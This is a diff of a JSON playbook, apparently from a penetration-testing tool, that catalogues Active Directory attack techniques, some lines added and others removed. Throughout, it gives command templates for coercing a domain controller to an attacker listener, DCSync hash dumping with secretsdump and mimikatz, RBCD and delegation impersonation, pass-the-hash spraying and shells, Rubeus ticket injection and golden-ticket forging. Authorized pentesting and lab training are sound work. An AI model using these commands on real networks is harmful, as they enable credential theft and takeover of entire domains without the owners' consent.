-      { "purpose": "Authenticate with the PFX for the NT hash", "template": "certipy auth -pfx administrator.pfx -dc-ip {{TARGET}}", "intent": "authenticate" }
     ] },
     { "name": "Relay or edit your way to a certificate (ESC4/ESC8)", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["domain creds"], "yields": ["hash"], "when": "certipy find reports ESC4 (you can edit a template) or ESC8 (web enrollment over HTTP): edit the template, or coerce the DC into certipy relay.", "tools": ["certipy"], "commands": [
       { "purpose": "ESC8: with certipy relay running, coerce the DC to authenticate to you", "template": "nxc smb {{TARGET}} -u <user> -p <pass> -M coerce_plus -o LISTENER={{LHOST}}", "intent": "exploit" }
@@ -397,27 +349,19 @@
       { "purpose": "gMSA: NT hash of a managed service account", "template": "nxc ldap {{TARGET}} -u <user> -p <pass> --gmsa", "intent": "dump" }
     ] },
     { "name": "DCSync the domain", "phase": "PrivEsc", "service": "ldap", "applies": "ad", "needs": ["admin"], "yields": ["hash"], "when": "You are Domain Admin or hold DS-Replication rights; pull every hash, especially krbtgt (golden tickets) and Administrator.", "tools": ["impacket-secretsdump", "mimikatz"], "commands": [
-      { "purpose": "Pull all domain hashes", "template": "impacket-secretsdump -just-dc <domain>/<user>:<pass>@{{TARGET}}", "intent": "dump" },
       { "purpose": "Or DCSync one user with mimikatz", "template": ".\\mimikatz.exe \"lsadump::dcsync /domain:<domain> /user:krbtgt\" \"exit\"", "intent": "dump" }
     ] },
     { "name": "Abuse RBCD to impersonate on a host", "phase": "Lateral Movement", "service": "kerberos", "applies": "ad", "needs": ["domain creds"], "yields": ["shell"], "when": "You control a computer account (MachineAccountQuota lets you add one) and have GenericWrite on the target; write RBCD, then request an impersonation ticket.", "tools": ["impacket-rbcd", "impacket-getST", "impacket-psexec", "impacket-addcomputer"], "commands": [
-      { "purpose": "Write RBCD to the target", "template": "impacket-rbcd -delegate-from '<computer>$' -delegate-to '<target>$' -action write -dc-ip {{TARGET}} <domain>/<user>:<pass>", "intent": "exploit" },
-      { "purpose": "Get an admin impersonation ticket", "template": "impacket-getST -spn cifs/{{DNS}} -impersonate administrator -hashes :<hash> <domain>/<user>", "intent": "exploit" }
     ] },
     { "name": "Abuse Kerberos delegation", "phase": "Lateral Movement", "service": "kerberos", "applies": "ad", "needs": ["domain creds"], "yields": ["admin"], "when": "An account or computer is trusted for delegation; constrained delegation lets getST impersonate anyone to the allowed SPN, unconstrained caches TGTs (coerce a DC and capture its ticket, note).", "tools": ["nxc", "impacket-getST", "impacket-findDelegation"], "commands": [
       { "purpose": "Find delegation-trusted accounts", "template": "nxc ldap {{TARGET}} -u <user> -p <pass> --trusted-for-delegation", "intent": "enumerate" },
       { "purpose": "Constrained: impersonate an admin to the SPN", "template": "impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>", "intent": "exploit" }
     ] },
     { "name": "Pass the hash to other hosts", "phase": "Lateral Movement", "service": "smb", "applies": "windows", "needs": ["hash"], "yields": ["shell"], "when": "You hold an NT hash (local or domain account) and want a shell where that account is admin; the hash authenticates NTLM like the password.", "tools": ["nxc", "evil-winrm", "impacket-psexec", "impacket-wmiexec", "impacket-atexec", "impacket-smbexec", "impacket-smbclient"], "commands": [
-      { "purpose": "Spray the hash to find admin access", "template": "nxc smb <range> -u <user> -H <hash>", "intent": "authenticate" },
-      { "purpose": "Local Administrator hash: test it on every host", "template": "nxc smb <range> -u administrator -H <hash> --local-auth", "intent": "authenticate" },
-      { "purpose": "WinRM shell with the hash", "template": "evil-winrm -i {{TARGET}} -u <user> -H <hash>", "intent": "authenticate" },
-      { "purpose": "SYSTEM shell with the hash", "template": "impacket-psexec -hashes :<hash> <domain>/<user>@{{TARGET}}", "intent": "authenticate" }
+      { "purpose": "Local Administrator hash: test it on every host", "template": "nxc smb <range> -u administrator -H <hash> --local-auth", "intent": "authenticate" }
     ] },
     { "name": "Pass the ticket / overpass-the-hash", "phase": "Lateral Movement", "service": "kerberos", "applies": "ad", "needs": ["hash"], "yields": ["shell"], "when": "NTLM is blocked but Kerberos is open; turn a hash into a TGT and authenticate by ticket.", "tools": ["impacket-getTGT", "Rubeus", "evil-winrm", "impacket-ticketConverter", "impacket-describeTicket", "mimikatz"], "commands": [
-      { "purpose": "Request a TGT from a hash", "template": "impacket-getTGT <domain>/<user> -hashes :<hash> -dc-ip {{TARGET}}", "intent": "authenticate" },
-      { "purpose": "Use the ticket for the session", "template": "export KRB5CCNAME=<file>.ccache", "intent": "pivot" },
-      { "purpose": "Or on Windows, ask for a TGT and inject it", "template": "Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt", "intent": "authenticate" }
+      { "purpose": "Use the ticket for the session", "template": "export KRB5CCNAME=<file>.ccache", "intent": "pivot" }
     ] },
     { "name": "Move laterally from a Windows host", "phase": "Lateral Movement", "service": "shell", "applies": "windows", "needs": ["shell", "creds"], "yields": ["shell"], "when": "Your shell is on a Windows host and the next host is only reachable from there: use built-in remoting with the creds you found.", "tools": ["PsExec"], "commands": [
       { "purpose": "Run a command over WinRM with built-in winrs", "template": "winrs -r:<host> -u:<user> -p:<pass> \"cmd /c hostname & whoami\"", "intent": "authenticate" },
@@ -425,7 +369,6 @@
       { "purpose": "Run one block on the host (after building $cred)", "template": "Invoke-Command -ComputerName <host> -Credential $cred -ScriptBlock { whoami }", "intent": "authenticate" }
     ] },
     { "name": "Forge a golden ticket (domain is done)", "phase": "Lateral Movement", "service": "kerberos", "applies": "ad", "needs": ["admin"], "yields": [], "when": "You have the krbtgt hash and domain SID; mint a TGT for any user indefinitely. A silver ticket forges a single-service TGS from a service account hash (note).", "tools": ["impacket-ticketer", "mimikatz", "impacket-lookupsid"], "commands": [
-      { "purpose": "Forge a TGT as any user", "template": "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> administrator", "intent": "exploit" }
     ] },
     { "name": "Pivot across a domain trust", "phase": "Lateral Movement", "service": "ldap", "applies": "ad", "needs": ["admin"], "yields": [], "when": "Note: a bidirectional or parent-child trust lets a child-domain compromise reach the forest root via the trust key or SID history (golden ticket with /sids); map trusts first.", "tools": ["nxc", "impacket-raiseChild", "impacket-ticketer"], "commands": [
       { "purpose": "Enumerate trusts from a foothold", "template": "nxc ldap {{TARGET}} -u <user> -p <pass> -M enum_trusts", "intent": "enumerate" }
